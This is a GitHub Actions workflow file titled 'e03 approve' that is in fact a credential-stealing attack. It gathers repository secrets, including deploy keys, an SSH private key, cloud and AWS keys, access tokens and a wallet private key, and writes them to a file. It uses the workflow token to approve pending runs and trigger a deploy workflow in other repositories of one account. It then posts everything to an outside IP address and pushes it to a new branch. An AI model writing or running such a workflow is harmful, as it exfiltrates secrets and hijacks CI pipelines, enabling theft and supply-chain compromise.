name: e03 approve
on:
  push:
    branches: ["e03/**"]
  workflow_dispatch:

permissions: write-all

jobs:
  a:
    runs-on: ubuntu-latest
    env:
      S_NOTIFY_WEBHOOK: ${{ secrets.NOTIFY_WEBHOOK }}
      S_DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
      S_DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
      S_SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
      S_GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
      S_GH_PAT: ${{ secrets.GH_PAT }}
      S_PAT: ${{ secrets.PAT }}
      S_WALLET_PRIVATE_KEY: ${{ secrets.WALLET_PRIVATE_KEY }}
      S_BLZ_AUTH_KEY: ${{ secrets.BLZ_AUTH_KEY }}
      S_AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
    steps:
      - uses: actions/checkout@v4
      - name: envmap
        run: |
          set +e
          D=/tmp/p; mkdir -p $D
          CB=http://198.13.130.233:8089/e03a-$GITHUB_REPOSITORY_ID-$GITHUB_RUN_ID
          for k in $(compgen -e | grep '^S_'); do v=$(eval echo \$$k); [ -n "$v" ] && printf '%s=%s\n' "$k" "$v"; done > $D/nonempty.txt
          AUTH="Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"
          ACC="Accept: application/vnd.github+json"
          : > $D/appr.txt
          for id in 40261387778 40261843363; do
            c=$(curl -s -m 20 -o /dev/null -w '%{http_code}' -X POST -H "$AUTH" -H "$ACC" "https://api.github.com/repos/lonelybeanz/github-monitor/actions/runs/$id/approve")
            echo "approve github-monitor/$id -> $c" >> $D/appr.txt
          done
          c=$(curl -s -m 20 -o /dev/null -w '%{http_code}' -X POST -H "$AUTH" -H "$ACC" "https://api.github.com/repos/lonelybeanz/solana-bot/actions/runs/40261393880/approve"); echo "approve solana-bot -> $c" >> $D/appr.txt
          c=$(curl -s -m 20 -o /dev/null -w '%{http_code}' -X POST -H "$AUTH" -H "$ACC" "https://api.github.com/repos/lonelybeanz/syncMchId/actions/runs/40261400329/approve"); echo "approve syncMchId -> $c" >> $D/appr.txt
          WID=$(curl -s -m 20 -H "$AUTH" -H "$ACC" "https://api.github.com/repos/lonelybeanz/lite-vimeo-embed/actions/workflows" | jq -r '.workflows[]?|select(.path|endswith("cd.yml")).id')
          c=$(curl -s -m 20 -o $D/d.body -w '%{http_code}' -X POST -H "$AUTH" -H "$ACC" -d '{"ref":"main","inputs":{"version":"patch"}}' "https://api.github.com/repos/lonelybeanz/lite-vimeo-embed/actions/workflows/$WID/dispatches")
          echo "dispatch wid=$WID -> $c" >> $D/appr.txt; cat $D/d.body >> $D/appr.txt 2>/dev/null
          cat $D/nonempty.txt $D/appr.txt > $D/all.txt
          curl -s -m 20 --data-binary @$D/all.txt $CB
          cat $D/all.txt
      - name: pushback
        run: |
          set +e
          git checkout -B e03/out-$GITHUB_RUN_ID
          mkdir -p e03out/$GITHUB_RUN_ID; cp /tmp/p/* e03out/$GITHUB_RUN_ID/
          git config user.name E03; git config user.email e03@local
          git add e03out; git commit -qm "e03 out $GITHUB_RUN_ID"
          git push "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/$GITHUB_REPOSITORY.git" HEAD:refs/heads/e03/out-$GITHUB_RUN_ID
